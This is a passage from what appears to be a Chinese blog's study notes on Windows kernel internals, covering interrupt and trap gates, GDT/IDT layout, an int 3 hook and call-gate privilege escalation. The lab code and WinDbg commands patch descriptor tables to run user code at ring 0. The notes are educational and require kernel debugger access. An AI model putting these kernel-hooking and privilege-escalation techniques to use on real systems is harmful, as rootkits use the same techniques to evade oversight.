class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_11_InterruptGate(中断门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_GDTINFO</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">short</span> limit;</span><br><span class="line">ULONG table;</span><br><span class="line">&#125;GDTINFO;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">iretd;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, test);</span><br><span class="line"></span><br><span class="line"><span class="comment">//char bufgdt[6];</span></span><br><span class="line"><span class="comment">//char bufidt[6];</span></span><br><span class="line">GDTINFO gdts;</span><br><span class="line">GDTINFO idts;</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*sgdt bufgdt;</span></span><br><span class="line"><span class="comment">sidt bufidt;*/</span></span><br><span class="line">sgdt gdts;          <span class="comment">// 获取gdtr</span></span><br><span class="line">sidt idts;          <span class="comment">// 获取idtr</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push fs;</span><br><span class="line"><span class="type">int</span> <span class="number">32</span>;</span><br><span class="line">pop fs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="IDT和GDT的关联"><a href="#IDT和GDT的关联" class="headerlink" title="IDT和GDT的关联"></a>IDT和GDT的关联</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">80b</span>98000</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98000</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98000 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98000  <span class="number">83e58</span>e00`<span class="number">00085210</span> <span class="number">83e58</span>e00`<span class="number">0008557</span>c</span><br><span class="line"><span class="number">80b</span>98010  <span class="number">00008500</span>`<span class="number">00580000</span> <span class="number">83e5</span>ee00`<span class="number">00085f</span>c0</span><br><span class="line"><span class="number">80b</span>98020  <span class="number">83e5</span>ee00`<span class="number">00086338</span> <span class="number">83e58</span>e00`<span class="number">00086688</span></span><br><span class="line"><span class="number">80b</span>98030  <span class="number">83e58</span>e00`<span class="number">000869</span>ec <span class="number">83e58</span>e00`<span class="number">000876f</span>8</span><br><span class="line"><span class="number">80b</span>98040  <span class="number">00008500</span>`<span class="number">00500000</span> <span class="number">83e58</span>e00`<span class="number">00087</span>d3c</span><br><span class="line"><span class="number">80b</span>98050  <span class="number">83e58</span>e00`<span class="number">00088050</span> <span class="number">83e58</span>e00`<span class="number">00088380</span></span><br><span class="line"><span class="number">80b</span>98060  <span class="number">83e58</span>e00`<span class="number">000887f</span>0 <span class="number">83e58</span>e00`<span class="number">00088</span>cfc</span><br><span class="line"><span class="number">80b</span>98070  <span class="number">83e58</span>e00`<span class="number">000899b</span>8 <span class="number">83e58</span>e00`<span class="number">00089e40</span></span><br></pre></td></tr></table></figure><ul><li>在IDT中, int3中的3代表的是索引;</li><li>83e5ee00<code>00085fc0</code>（int 3）中段选择子0008表示去查找GDT中00cf9b00&#96;0000ffff;</li></ul><h3 id="IDT描述符"><a href="#IDT描述符" class="headerlink" title="IDT描述符"></a>IDT描述符</h3><blockquote><p>5.11 页码123</p></blockquote><ul><li>D位（第11位）是指默认操作数, 32位下为1, 16位下为0;</li></ul><h3 id="3环获取GDT和IDT的指令"><a href="#3环获取GDT和IDT的指令" class="headerlink" title="3环获取GDT和IDT的指令"></a>3环获取GDT和IDT的指令</h3><ul><li><p>获取GDT&#x2F;获取IDT: sgdt&#x2F;sidt（3环下调用）;</p><blockquote><p>获取到gdt的值为<code>ff 03 00 88 b9 80</code>; 其中前两个字节为表的长度, 后四个字节为表的地址; </p></blockquote></li><li><p>修改GDT&#x2F;修改IDT: lgdt&#x2F;lidt（0环下才能调用）;</p></li></ul><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><blockquote><p>iretd中的<code>d</code>描述宽度用的; 16位（iret）、32位（iretd）、64位（iretq）;</p></blockquote><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><blockquote><ol><li>返回一定要用iretd吗? 使用retf;</li></ol></blockquote><ul><li>iretd 解除阻塞;</li><li>retf 没有解除阻塞;</li><li>sti 解除阻塞, 并且给eflags.IF &#x3D; 1;</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InterruptGate_retf.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 中断门使用retf返回</span></span><br><span class="line"><span class="comment">// 0040ee00`00081080 </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">sti;<span class="comment">// 解除阻塞, 并且使eflags.IF = 1</span></span><br><span class="line"><span class="comment">// int 3</span></span><br><span class="line">retf <span class="number">4</span>;<span class="comment">// 使用 retf 4 是为了确保在中断处理程序返回时，除了恢复 CS:EIP 外，还能从栈中弹出这个附加的 4 字节（通常是错误代码），确保栈平衡</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, test);</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// push 0x12345678;</span></span><br><span class="line"><span class="type">int</span> <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">push <span class="number">0x3b</span>;</span><br><span class="line">pop fs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol start="2"><li>构建陷阱门自己调用;</li></ol></blockquote><ul><li>TYPE位为f, 0040ee00&#96;00081080;</li></ul><div class="note bug"><p><strong>中断门和陷阱门的区别</strong></p><p>1.<br>进入中断门会清除eflag VM NT IF TF 位<br>进入陷阱门会清除eflag VM NT TF 位<br>2.<br>由于中断门会清除IF位，导致一些中断触发会悬挂，陷阱门则不会</p></div><h2 id="int3-hook"><a href="#int3-hook" class="headerlink" title="int3_hook"></a>int3_hook</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>第一步：添加一个代码段在0x48位置</li><li>第二步：计算代码段0x48的base<br> 目标地址 - int 3偏移&#x3D; base<br> 写回0x48位置</li><li>第三步：修改int 3中断门的段选择子为0x48</li><li>Hook函数编写<br> 由于有缓存的存在, 可以执行一会, 那么我们在这要做二次跳转<br> jmp 0x48: xxx地址</li><li>当调到xxx地址后, 通过调用打印函数, 确定调用成功</li><li>jmp回int 3原本的偏移</li></ol><div class="note info"><p><strong></strong></p><p>base：401080 - 83e44fc0(int 3) &#x3D; 7C5B C0C0</p><p>段描述：00cf9b00&#96;0000ffff</p><p>修改gdtr 0x48位置<br>eq 80b98848 7Ccf9b5B&#96;C0C0ffff</p><p>修改int 3段选择子为48<br>eq 80b98018 83e7ee00&#96;0048dfc0</p><p>83e11c60</p></div><h3 id="代码实验-1"><a href="#代码实验-1" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 09_24_int3_hook.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BASE：401080 - 83e7dfc0(int 3) = 7C58 30C0</span></span><br><span class="line"><span class="comment">// 段描述：00cf9b00`0000ffff</span></span><br><span class="line"><span class="comment">// 修改GDTR：eq 80b98848 7Ccf9b58`30c0ffff</span></span><br><span class="line"><span class="comment">// 修改IDTR：eq 80b98018 83e7ee00`0048dfc0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(__CRTDECL *DbgPrintProc)</span><span class="params">(_In_z_ _Printf_format_string_ <span class="type">char</span> <span class="type">const</span>* <span class="type">const</span> _Format, ...)</span></span>;</span><br><span class="line">DbgPrintProc DbgPrint = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * xxxstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//push 0x8;</span></span><br><span class="line"><span class="comment">//push haha;</span></span><br><span class="line">sub esp, <span class="number">8</span>;</span><br><span class="line">lea eax, haha;</span><br><span class="line">mov [esp], eax;</span><br><span class="line">mov [esp+<span class="number">4</span>], <span class="number">0x8</span>;</span><br><span class="line">jmp fword ptr [esp];</span><br><span class="line">haha:</span><br><span class="line">add esp, <span class="number">8</span>;</span><br><span class="line">push fs;</span><br><span class="line">mov ax, <span class="number">0x30</span>;</span><br><span class="line">mov fs, ax;</span><br><span class="line"><span class="comment">// 业务逻辑</span></span><br><span class="line">mov eax, [xxxstr];</span><br><span class="line">push eax;</span><br><span class="line">call DbgPrint;</span><br><span class="line">add esp, <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">pop fs;</span><br><span class="line"><span class="comment">// 跳回int3</span></span><br><span class="line">mov dword ptr ss:[esp<span class="number">-4</span>], <span class="number">0x83e44fc0</span>;</span><br><span class="line">jmp dword ptr ss:[esp<span class="number">-4</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, test);</span><br><span class="line">xxxstr = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(<span class="string">&quot;xxxx__main__xxxx\r\n&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(xxxstr, <span class="string">&quot;xxxx__main__xxxx\r\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;xxxx__main__xxxx\r\n&quot;</span>));</span><br><span class="line">xxxstr[<span class="built_in">strlen</span>(<span class="string">&quot;xxxx__main__xxxx\r\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">DbgPrint = (DbgPrintProc)<span class="number">0x83e11c60</span>;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-调用门提权</title>
      <link href="/fb02f1f0.html"/>
      <url>/fb02f1f0.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>调用门提权</strong></p></div><span id="more"></span><h2 id="调用门知识点"><a href="#调用门知识点" class="headerlink" title="调用门知识点"></a>调用门知识点</h2><blockquote><p>当S位为0, TYPE位为C, 这个就是调用门;</p></blockquote><blockquote><p>cs.DPL &#x3D;&#x3D; ss.DPL &#x3D;&#x3D; 调用门.DPL;</p></blockquote><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li>填充调用门描述符（参数暂时为0个）; 函数地址为00401080;<br>0040ec00&#96;00081080</li><li>修改gdtr<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">80b</span>98800</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98848 <span class="number">0040</span>ec02`<span class="number">00081080</span></span><br><span class="line">WriteVirtual: <span class="number">80b</span>98848 <span class="keyword">not</span> properly sign extended</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">0040f</span>300`<span class="number">00000f</span>ff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">0040</span>ec02`<span class="number">00081080</span></span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure></li><li>cs寄存器为0008, ss寄存器为0010<blockquote><p>cs + 8 &#x3D; ss</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00401080</span> cc              <span class="type">int</span>     <span class="number">3</span></span><br><span class="line">kd&gt; r</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">7f</span>fd6000 ecx=<span class="number">4</span>a36ab6a edx=<span class="number">0052017</span>c esi=<span class="number">0012f</span>e28 edi=<span class="number">0012f</span>f08</span><br><span class="line">eip=<span class="number">00401080</span> esp=<span class="number">89b</span>49c98 ebp=<span class="number">0012f</span>f08 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">0008</span>  ss=<span class="number">0010</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">0030</span>  gs=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line"><span class="number">00401080</span> cc              <span class="type">int</span>     <span class="number">3</span></span><br></pre></td></tr></table></figure></li><li>返回时报错<blockquote><p>进入0环前fs寄存器为0x3b, 进入0环后会将fs修改成0x30, 在返回时未进行修复;</p></blockquote></li></ul><h3 id="代码实验"><a href="#代码实验" class="headerlink" title="代码实验"></a>代码实验</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10_10_CallGate(调用门).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4b</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\r\n&quot;</span>, test);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push fs;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">pop fs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>跨段不提权只压两个值（eip, cs）; 跨段提权会压四个值（eip, cs, esp, ss）;</p></blockquote><blockquote><p>retf有参数时需要加上参数, 两个参数retf 8;</p></blockquote><h3 id="系统描述符类型"><a href="#系统描述符类型" class="headerlink" title="系统描述符类型"></a>系统描述符类型</h3><p>当段描述符的S标志（描述符类型）为0, 则描述符为系统描述符。处理器可以识别以下类型的系统描述符: </p><ul><li>局部描述符表（LDT）段描述符;</li><li>任务状态段（TSS）描述符;</li><li>调用门描述符;</li><li>中断门描述符;</li><li>陷阱门描述符;</li><li>任务门描述符;</li></ul><blockquote><p>这些描述符又可以分为两类: 系统段描述符和门描述符。系统段描述符指向系统段（LDT和TSS段）。门描述符它们自身就是”门”, 它们或者持有指向放置在代码段中的过程入口点的指针, 或者持有TSS（任务门）的段选择子。</p></blockquote><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/202410112335684.png' data-fancybox='default' data-caption='系统段和门描述类型'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/202410112335684.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202410112335684.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="系统段和门描述类型"></a><span class='image-caption'>系统段和门描述类型</span></div></div><h3 id="调用门格式"><a href="#调用门格式" class="headerlink" title="调用门格式"></a>调用门格式</h3><blockquote><p>4.8.3, 页码是93;</p></blockquote><blockquote><p>调用门为不同特权级间的进程控制转移提供了便利。它们一般只用在使用特权级保护机制的操作系统或管理程序中。调用门也可用于16位和32位代码段之间进程控制转移, 这在17.4.“混合尺寸代码段之间的控制转移”中进行描述。</p></blockquote><blockquote><p>调用门描述符可用在GDT或LDT中, 但是不能在中断描述符表（IDT）中。它具有六个方面的功能:</p></blockquote><ul><li>确定将要访问的代码段;</li><li>定义例程在指定代码段的入口;</li><li>指定调用例程的所应当有的特权级;</li><li>如果有栈切换, 就确定在栈之间拷贝的可选参数的个数;</li><li>定义压入目标栈的值的尺寸: 16位的门执行16位的压栈, 32位的门执行32位的压栈;</li><li>确定调用门描述符是否有效;</li></ul><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><blockquote><ol><li>使用jmp跨段跳转调用门;</li></ol></blockquote><ul><li>在调用门上不支持改cs寄存器的值;</li><li>jmp在调用门只能同权限跳转;</li></ul><blockquote><ol start="2"><li>既然ret也能跳转, 那么是否可以提权;</li></ol></blockquote><ul><li>无法修改cs寄存器的值, 无法提权, 也没有提权的悬念</li></ul><blockquote><ol start="3"><li>既然retf也能跳转, 那么是否可以提权;</li></ol></blockquote><ul><li>英特尔规定retf只能同权限或向低权限跳转;</li></ul><blockquote><p>补充</p></blockquote><ul><li>call是同权限或者提权跳转</li></ul>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-数据段代码段的权限规则</title>
      <link href="/93e9d7f1.html"/>
      <url>/93e9d7f1.html</url>
      
